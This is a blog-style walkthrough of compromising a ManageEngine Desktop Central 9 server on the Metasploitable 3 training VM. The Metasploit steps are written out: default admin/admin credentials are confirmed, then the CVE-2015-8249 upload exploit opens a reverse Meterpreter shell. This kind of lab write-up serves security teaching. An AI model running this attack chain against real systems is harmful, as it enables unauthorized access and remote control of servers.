---
layout: post
title: "Metasploitable 3 - ManageEngine DesktopCentral 9"
date: 2017-01-12T04:44:00Z
author: gu4r15sm0
---

Metasploitable 3
Remote Code Execution on ManageEngine DesktopCentral 9
If you remember, we found a Apache Tomcat running on TCP port 8022
msf > services
Services
\========
host         port   proto  name          state  info
\----         ----   -----  ----          -----  ----
10.20.10.23  21     tcp    ftp           open   Microsoft ftpd
10.20.10.23  22     tcp    ssh           open   OpenSSH 7.1 protocol 2.0
10.20.10.23  80     tcp    http          open   Microsoft IIS httpd 7.5
10.20.10.23  161    udp    snmp          open   SNMPv1 server public
10.20.10.23  1617   tcp    nimrod-agent  open   
10.20.10.23  3000   tcp    http          open   WEBrick httpd 1.3.1 Ruby 2.3.1 (2016-04-26)
10.20.10.23  4848   tcp    ssl/http      open   Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8
10.20.10.23  5985   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.20.10.23  8020   tcp    http          open   Apache httpd
**10.20.10.23  8022   tcp    http          open   Apache Tomcat/Coyote JSP engine 1.1**
10.20.10.23  8027   tcp                  open   
10.20.10.23  8080   tcp    http          open   Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8
10.20.10.23  8282   tcp    http          open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.20.10.23  8383   tcp    ssl/http      open   Apache httpd
10.20.10.23  8484   tcp    http          open   Jetty winstone-2.8
10.20.10.23  8585   tcp    http          open   Apache httpd 2.2.21 (Win64) PHP/5.3.10 DAV/2
10.20.10.23  9200   tcp    http          open   Elasticsearch REST API 1.1.1 name: Mammomax; Lucene 4.7
10.20.10.23  49153  tcp    msrpc         open   Microsoft Windows RPC
10.20.10.23  49154  tcp    msrpc         open   Microsoft Windows RPC
10.20.10.23  49263  tcp                  open   
10.20.10.23  49264  tcp    tcpwrapped    open   

So I decided to investigate by opening a browser to see what application was running on tomcat

[![](/assets/images/desktopcentral9.JPG)](/assets/images/desktopcentral9.JPG)

Desktop Central 9

I found a [ManageEngine - Desktop Central 9](https://www.manageengine.com/products/desktop-central/index.html?dci) login, with what looks like default credentials autocompleted.

Doing some research I found out that this wonderful Java App is very useful, it helps companies with

-   Patch Managment
-   Software Deployment
-   Remote Control
-   Asset Management
-   Service Pack Installation
-   User Administration
-   etc, etc, etc

There's even a Mobile App to do all that stuff on the go! Cool stuff!!

Going back to the default credentials, it seems that password is also 'admin', I could confirm it in the Web Interface, but I decided to use metasploit since this is Metasploitable anyway, right? :)

First, we look for what's available against ManageEngine products

msf > search manageengine

Matching Modules

\================

   Name                                                            Disclosure Date  Rank       Description

   ----                                                            ---------------  ----       -----------

   auxiliary/admin/http/manage\_engine\_dc\_create\_admin              2014-12-31       normal     ManageEngine Desktop Central Administrator Account Creation

   auxiliary/admin/http/manageengine\_dir\_listing                   2015-01-28       normal     ManageEngine Multiple Products Arbitrary Directory Listing

   auxiliary/admin/http/manageengine\_file\_download                 2015-01-28       normal     ManageEngine Multiple Products Arbitrary File Download

   auxiliary/admin/http/manageengine\_pmp\_privesc                   2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection

   auxiliary/admin/http/netflow\_file\_download                      2014-11-30       normal     ManageEngine NetFlow Analyzer Arbitrary File Download

   auxiliary/gather/eventlog\_cred\_disclosure                       2014-11-05       normal     ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure

   **auxiliary/scanner/http/manageengine\_desktop\_central\_login                        normal     ManageEngine Desktop Central Login Utility**

   auxiliary/scanner/http/manageengine\_deviceexpert\_traversal      2012-03-18       normal     ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal

   auxiliary/scanner/http/manageengine\_deviceexpert\_user\_creds     2014-08-28       normal     ManageEngine DeviceExpert User Credentials

   auxiliary/scanner/http/manageengine\_securitymanager\_traversal   2012-10-19       normal     ManageEngine SecurityManager Plus 5.5 Directory Traversal

   auxiliary/scanner/http/servicedesk\_plus\_traversal               2015-10-03       normal     ManageEngine ServiceDesk Plus Path Traversal

   auxiliary/scanner/http/support\_center\_plus\_directory\_traversal  2014-01-28       normal     ManageEngine Support Center Plus Directory Traversal

   exploit/multi/http/eventlog\_file\_upload                         2014-08-31       excellent  ManageEngine Eventlog Analyzer Arbitrary File Upload

   exploit/multi/http/manage\_engine\_dc\_pmp\_sqli                    2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection

   exploit/multi/http/manageengine\_auth\_upload                     2014-12-15       excellent  ManageEngine Multiple Products Authenticated File Upload

   exploit/multi/http/manageengine\_sd\_uploader                     2015-08-20       excellent  ManageEngine ServiceDesk Plus Arbitrary File Upload

   exploit/multi/http/manageengine\_search\_sqli                     2012-10-18       excellent  ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection

   exploit/multi/http/opmanager\_socialit\_file\_upload               2014-09-27       excellent  ManageEngine OpManager and Social IT Arbitrary File Upload

   **exploit/windows/http/desktopcentral\_file\_upload**                 **2013-11-11       excellent  ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload**

   **exploit/windows/http/desktopcentral\_statusupdate\_upload         2014-08-31       excellent  ManageEngine Desktop Central StatusUpdate Arbitrary File Upload**

   exploit/windows/http/manage\_engine\_opmanager\_rce                2015-09-14       manual     ManageEngine OpManager Remote Code Execution

   exploit/windows/http/manageengine\_apps\_mngr                     2011-04-08       average    ManageEngine Applications Manager Authenticated Code Execution

   **exploit/windows/http/manageengine\_connectionid\_write            2015-12-14       excellent  ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability**

   exploit/windows/misc/manageengine\_eventlog\_analyzer\_rce         2015-07-11       manual     ManageEngine EventLog Analyzer Remote Code Execution

A lot of good stuff.

Ok let's use the auxiliary/scanner/http/manageengine\_desktop\_central\_login to make sure our admin/admin creds work

msf > use **auxiliary/scanner/http/manageengine\_desktop\_central\_login**

msf auxiliary(manageengine\_desktop\_central\_login) > options

Module options (auxiliary/scanner/http/manageengine\_desktop\_central\_login):

   Name              Current Setting  Required  Description

   ----              ---------------  --------  -----------

   BLANK\_PASSWORDS   false            no        Try blank passwords for all users

   BRUTEFORCE\_SPEED  5                yes       How fast to bruteforce, from 0 to 5

   DB\_ALL\_CREDS      false            no        Try each user/password couple stored in the current database

   DB\_ALL\_PASS       false            no        Add all passwords in the current database to the list

   DB\_ALL\_USERS      false            no        Add all users in the current database to the list

   PASSWORD                           no        A specific password to authenticate with

   PASS\_FILE                          no        File containing passwords, one per line

   Proxies                            no        A proxy chain of format type:host:port\[,type:host:port\]\[...\]

   RHOSTS                             yes       The target address range or CIDR identifier

   RPORT             8020             yes       The target port

   SSL               false            no        Negotiate SSL/TLS for outgoing connections

   STOP\_ON\_SUCCESS   false            yes       Stop guessing when a credential works for a host

   THREADS           1                yes       The number of concurrent threads

   USERNAME                           no        A specific username to authenticate as

   USERPASS\_FILE                      no        File containing users and passwords separated by space, one pair per line

   USER\_AS\_PASS      false            no        Try the username as the password for all users

   USER\_FILE                          no        File containing usernames, one per line

   VERBOSE           true             yes       Whether to print output for all attempts

   VHOST                              no        HTTP server virtual host

I set the USERNAME option to admin and the USER\_AS\_PASS to true so it tries the same username as the password.

msf auxiliary(manageengine\_desktop\_central\_login) > set USER\_AS\_PASS true

USER\_AS\_PASS => true

msf auxiliary(manageengine\_desktop\_central\_login) > set USERNAME admin

USERNAME => admin

msf auxiliary(manageengine\_desktop\_central\_login) > options

Module options (auxiliary/scanner/http/manageengine\_desktop\_central\_login):

   Name              Current Setting  Required  Description

   ----              ---------------  --------  -----------

   BLANK\_PASSWORDS   false            no        Try blank passwords for all users

   BRUTEFORCE\_SPEED  5                yes       How fast to bruteforce, from 0 to 5

   DB\_ALL\_CREDS      false            no        Try each user/password couple stored in the current database

   DB\_ALL\_PASS       false            no        Add all passwords in the current database to the list

   DB\_ALL\_USERS      false            no        Add all users in the current database to the list

   PASSWORD                           no        A specific password to authenticate with

   PASS\_FILE                          no        File containing passwords, one per line

   Proxies                            no        A proxy chain of format type:host:port\[,type:host:port\]\[...\]

   RHOSTS                             yes       The target address range or CIDR identifier

   RPORT             8020             yes       The target port

   SSL               false            no        Negotiate SSL/TLS for outgoing connections

   STOP\_ON\_SUCCESS   false            yes       Stop guessing when a credential works for a host

   THREADS           1                yes       The number of concurrent threads

   **USERNAME          admin**            no        A specific username to authenticate as

   USERPASS\_FILE                      no        File containing users and passwords separated by space, one pair per line

   **USER\_AS\_PASS      true**             no        Try the username as the password for all users

   USER\_FILE                          no        File containing usernames, one per line

   VERBOSE           true             yes       Whether to print output for all attempts

   VHOST                              no        HTTP server virtual host

I set the RHOSTS to the IP address of my Metasploitable 3 server, and RPORT to the TCP port reported by nmap and stored in my metasploite db

msf auxiliary(manageengine\_desktop\_central\_login) > set RHOSTS 10.20.10.23

RHOSTS => 10.20.10.23

msf auxiliary(manageengine\_desktop\_central\_login) > set RPORT 8022

RPORT => 8022

msf auxiliary(manageengine\_desktop\_central\_login) > run

**\[+\] MANAGEENGINE\_DESKTOP\_CENTRAL - Success: 'admin:admin'**

\[\*\] Scanned 1 of 1 hosts (100% complete)

\[\*\] Auxiliary module execution completed

Confirmed! admin/admin is a valid credential and is now saved in my workspace in case I need it.

msf auxiliary(**manageengine\_desktop\_central\_login**) > creds

Credentials

\===========

host         origin       service          public  private  realm  private\_type

\----         ------       -------          ------  -------  -----  ------------

10.20.10.23  10.20.10.23  8022/tcp (http)  admin   admin           Password

Now let's try exploiting one of those. I chose the Desktop Central 9 FileUploadServlet ConnectionId Vulnerability:

[CVE-2015-8249](https://community.rapid7.com/community/infosec/blog/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249)

msf auxiliary(manageengine\_desktop\_central\_login) > use exploit/windows/http/manageengine\_connectionid\_write

msf exploit(manageengine\_connectionid\_write) > options

Module options (exploit/windows/http/manageengine\_connectionid\_write):

   Name       Current Setting  Required  Description

   ----       ---------------  --------  -----------

   Proxies                     no        A proxy chain of format type:host:port\[,type:host:port\]\[...\]

   **RHOST      10.20.10.23**      yes       The target address

   RPORT      8020             yes       The target port

   SSL        false            no        Negotiate SSL/TLS for outgoing connections

   TARGETURI  /                yes       The base path for ManageEngine Desktop Central

   VHOST                       no        HTTP server virtual host

Exploit target:

   Id  Name

   --  ----

   0   ManageEngine Desktop Central 9 on Windows

I have to change the RPORT to 8022

msf exploit(**manageengine\_connectionid\_write**) > set RPORT 8022

RPORT => 8022

msf exploit(manageengine\_connectionid\_write) > run

\[\*\] Started reverse TCP handler on 10.23.10.200:4444 

\[\*\] Creating JSP stager

\[\*\] Uploading JSP stager MoRCg.jsp...

\[\*\] Executing stager...

\[\*\] Sending stage (957487 bytes) to 10.20.10.23

\[\*\] Meterpreter session 1 opened (10.23.10.200:4444 -> 10.20.10.23:64823) at 2017-01-11 22:11:46 -0500

\[+\] Deleted ../webapps/DesktopCentral/jspf/MoRCg.jsp

**meterpreter > dir**

Listing: C:\\ManageEngine\\DesktopCentral\_Server\\bin

\==================================================

Mode              Size     Type  Last modified              Name

\----              ----     ----  -------------              ----

100666/rw-rw-rw-  5        fil   2016-12-17 15:30:38 -0500  .lock

100777/rwxrwxrwx  587776   fil   2015-10-07 09:32:36 -0400  7za.exe

100666/rw-rw-rw-  2028     fil   2015-10-07 09:32:38 -0400  ComputerList.vbs

100666/rw-rw-rw-  624      fil   2016-12-17 15:29:35 -0500  ConfigServer\_log.txt

100777/rwxrwxrwx  53248    fil   2015-10-07 09:32:38 -0400  ConvertSIDTOAccountName.exe

100777/rwxrwxrwx  228      fil   2015-10-07 09:32:36 -0400  CopyFolder.bat

100777/rwxrwxrwx  944      fil   2015-10-07 09:32:38 -0400  DCService.bat

...

**meterpreter** > pwd

C:\\ManageEngine\\DesktopCentral\_Server\\bin

meterpreter > shell

Process 5984 created.

Channel 2 created.

Microsoft Windows \[Version 6.1.7601\]

Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\\ManageEngine\\DesktopCentral\_Server\\bin>whoami

whoami

**nt authority\\local service**

C:\\ManageEngine\\DesktopCentral\_Server\\bin>

I got a Remote Shell :) you can use this one to look for flags/cards or to gather more information about the system.

Back in meterpreter

meterpreter > search -f king\*

Found 4 results...

    c:\\vagrant\\resources\\flags\\kingofclubs.exe (824563 bytes)

    c:\\wamp\\www\\wordpress\\wp-content\\uploads\\2016\\09\\king\_of\_damonds-150x150.png (46738 bytes)

    c:\\wamp\\www\\wordpress\\wp-content\\uploads\\2016\\09\\king\_of\_damonds-214x300.png (130832 bytes)

    **c:\\wamp\\www\\wordpress\\wp-content\\uploads\\2016\\09\\king\_of\_damonds.png** (585695 bytes)